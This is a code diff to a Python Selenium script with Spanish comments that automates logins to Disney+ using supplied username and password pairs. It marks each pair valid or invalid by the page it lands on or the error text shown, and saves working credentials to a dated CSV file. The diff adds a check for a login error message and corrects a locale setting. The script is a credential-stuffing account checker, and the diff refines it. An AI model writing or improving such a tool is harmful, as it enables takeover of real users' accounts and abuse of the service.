@@ -10,6 +10,8 @@ from selenium.common.exceptions import NoSuchElementException, WebDriverExceptio
 from tqdm import tqdm
 from datetime import datetime
 
+
+
 def iniciar_sesion(usuario, contrasena, credenciales_validas):
     try:
         # Inicializar el navegador Chrome
@@ -47,6 +49,7 @@ def iniciar_sesion(usuario, contrasena, credenciales_validas):
         time.sleep(10)
 
         # Verificar si se redirige a la página de prueba o de cuenta en espera
+        error_message = "Ocurrió un error al iniciar sesión."
         invalid_urls = [
             'https://www.disneyplus.com/es-419/restart-subscription?pinned=true',
             'https://www.disneyplus.com/es-419/complete-purchase?pinned=true',
@@ -54,6 +57,8 @@ def iniciar_sesion(usuario, contrasena, credenciales_validas):
         ]
         if driver.current_url in invalid_urls:
             print(f"Las credenciales {usuario}, {contrasena} son inválidas (página de prueba o cuenta en espera).")
+        elif error_message in driver.page_source:
+            print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
         else:
             # Buscar el mensaje de error en el contenido de la página
             page_content = driver.page_source
@@ -96,7 +101,7 @@ if os.path.isfile(csv_file_path):
 
 # Guardar las credenciales válidas en un archivo .csv
 if credenciales_validas:
-    locale.setlocale(locale.LC_TIME, 'en_ES.UTF-8')
+    locale.setlocale(locale.LC_TIME, 'es_ES.UTF-8')
     now = datetime.now()
     format_date = now.strftime('%d-%b-%Y_%I-%M-%S %p')  # Formato de fecha en el nombre del archivo
 
